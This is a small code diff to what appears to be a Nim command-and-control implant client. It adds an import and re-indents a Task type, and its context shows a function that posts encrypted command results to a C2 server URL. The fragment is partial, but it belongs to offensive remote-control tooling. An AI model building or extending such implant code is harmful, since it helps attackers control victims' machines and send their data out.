@@ -1,6 +1,7 @@
 import httpclient, json, strformat
 import config, crypto
 import times
+import std/parseutils
 
 let client = newHttpClient()
 
@@ -50,8 +51,8 @@ proc sendTaskResult*(id: string, task_id: string,command: string,result: string)
     return client.postContent(C2_URL & RESULT_URI, enc)
 
 type Task = object
-  task_id: string
-  command: string
+    task_id: string
+    command: string
 
 proc parseTask*(raw: string): Task =
     let j = parseJson(raw)
